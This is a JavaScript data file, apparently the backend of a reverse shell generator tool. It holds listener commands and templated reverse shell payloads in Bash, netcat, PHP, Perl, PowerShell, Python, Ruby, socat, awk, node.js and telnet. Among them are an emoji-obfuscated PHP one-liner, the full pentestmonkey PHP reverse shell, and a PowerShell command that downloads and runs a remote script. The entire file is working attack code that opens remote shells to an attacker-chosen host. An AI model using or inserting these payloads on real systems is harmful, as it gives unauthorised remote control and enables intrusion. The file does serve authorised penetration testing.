const rsgData = {

    listenerCommands: [
        ['nc', 'nc -lvnp {port}'],
        ['rlwrap + nc', 'rlwrap nc -lvnp {port}'],
        ['pwncat', 'python3 -m pwncat -lp {port}'],
        ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
        ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
        ['powercat', 'powercat -l -p {port}']
    ],

    shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
    
    reverseShellsCommands: [
        ['Bash -i', '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'],
        ['Bash 196', '0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196'],
        ['Bash read line', 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'],
        ['Bash 5', '{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5'],
        ['Bash udp', '{shell} -i >& /dev/udp/{ip}/{port} 0>&1'],
        ['nc mkfifo', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'],
        ['nc -e', 'nc -e {shell} {ip} {port}'],
        ['nc -c', 'nc -c {shell} {ip} {port}'],
        ['ncat -e', 'ncat {ip} {port} -e {shell} '],
        ['ncat udp', 'ncat {ip} {port} -e {shell}'],
        ['Emoji PHP', 'php -r \'$😀="1";$😁="2";$😅="3";$😆="4";$😉="5";$😊="6";$😎="7";$😍="8";$😚="9";$🙂="0";$🤢=" ";$🤓="<";$🤠=">";$😱="-";$😵="&";$🤩="i";$🤔=".";$🤨="/";$🥰="a";$😐="b";$😶="i";$🙄="h";$😂="c";$🤣="d";$😃="e";$😄="f";$😋="k";$😘="n";$😗="o";$😙="p";$🤗="s";$😑="x";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = "{ip}";$💻 = {port};$🐚 = "{shell}". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);\''],
        ['Perl', 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};\''],
        ['Perl no sh', 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{port}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''],
        ['PHP PentestMonkey', '&lt;?php\n\/\/ php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https:\/\/raw.githubusercontent.com\/pentestmonkey\/php-reverse-shell\/master\/php-reverse-shell.php\n\/\/ Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = \'{ip}\';\n$port = {port};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = \'uname -a; w; id; {shell} -i\';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists(\'pcntl_fork\')) {\n	$pid = pcntl_fork();\n	\n	if ($pid == -1) {\n		printit(\"ERROR: Can\'t fork\");\n		exit(1);\n	}\n	\n	if ($pid) {\n		exit(0);  \/\/ Parent exits\n	}\n	if (posix_setsid() == -1) {\n		printit(\"Error: Can\'t setsid()\");\n		exit(1);\n	}\n\n	$daemon = 1;\n} else {\n	printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"\/\");\n\numask(0);\n\n\/\/ Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n	printit(\"$errstr ($errno)\");\n	exit(1);\n}\n\n$descriptorspec = array(\n   0 =&gt; array(\"pipe\", \"r\"),  \/\/ stdin is a pipe that the child will read from\n   1 =&gt; array(\"pipe\", \"w\"),  \/\/ stdout is a pipe that the child will write to\n   2 =&gt; array(\"pipe\", \"w\")   \/\/ stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n	printit(\"ERROR: Can\'t spawn shell\");\n	exit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n	if (feof($sock)) {\n		printit(\"ERROR: Shell connection terminated\");\n		break;\n	}\n\n	if (feof($pipes[1])) {\n		printit(\"ERROR: Shell process terminated\");\n		break;\n	}\n\n	$read_a = array($sock, $pipes[1], $pipes[2]);\n	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n	if (in_array($sock, $read_a)) {\n		if ($debug) printit(\"SOCK READ\");\n		$input = fread($sock, $chunk_size);\n		if ($debug) printit(\"SOCK: $input\");\n		fwrite($pipes[0], $input);\n	}\n\n	if (in_array($pipes[1], $read_a)) {\n		if ($debug) printit(\"STDOUT READ\");\n		$input = fread($pipes[1], $chunk_size);\n		if ($debug) printit(\"STDOUT: $input\");\n		fwrite($sock, $input);\n	}\n\n	if (in_array($pipes[2], $read_a)) {\n		if ($debug) printit(\"STDERR READ\");\n		$input = fread($pipes[2], $chunk_size);\n		if ($debug) printit(\"STDERR: $input\");\n		fwrite($sock, $input);\n	}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n	if (!$daemon) {\n		print \"$string\\n\";\n	}\n}\n\n?&gt;'],
        ['PHP exec', 'php -r \'$sock=fsockopen("{ip}",{port});exec("{shell} -i <&3 >&3 2>&3");\''],
        ['PHP shell_exec', 'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("{shell} -i <&3 >&3 2>&3");\''],
        ['PHP system', 'php -r \'$sock=fsockopen("{ip}",{port});system("{shell} -i <&3 >&3 2>&3");\''],
        ['PHP passthru', 'php -r \'$sock=fsockopen("{ip}",{port});passthru("{shell} -i <&3 >&3 2>&3");\''],
        ['PHP `', 'php -r \'$sock=fsockopen("{ip}",{port});`{shell} -i <&3 >&3 2>&3`;\''],
        ['PHP popen', 'php -r \'$sock=fsockopen("{ip}",{port});popen("{shell} -i <&3 >&3 2>&3", "r");\''],
        ['Windows ConPty', 'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}'],
        ['PowerShell #1', 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'],
        ['PowerShell #2', 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'],
        ['PowerShell #3 (Base64)', undefined],
        ['Python #1', 'export RHOST="{ip}";export RPORT={port};python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")\''],
        ['Python #2', 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")\''],
        ['Ruby #1', 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("{shell} -i <&%d >&%d 2>&%d",f,f,f)\''],
        ['Ruby no sh', 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''],
        ['socat #1', 'socat TCP:{ip}:{port} EXEC:{shell}'],
        ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane'],
        ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'],
        ['node.js', 'require(\'child_process\').exec(\'nc -e {shell} {ip} {port}\')'],
        ['telnet', 'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF'],
    ],

    specialCommands: {
        'PowerShell payload': '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    }
}
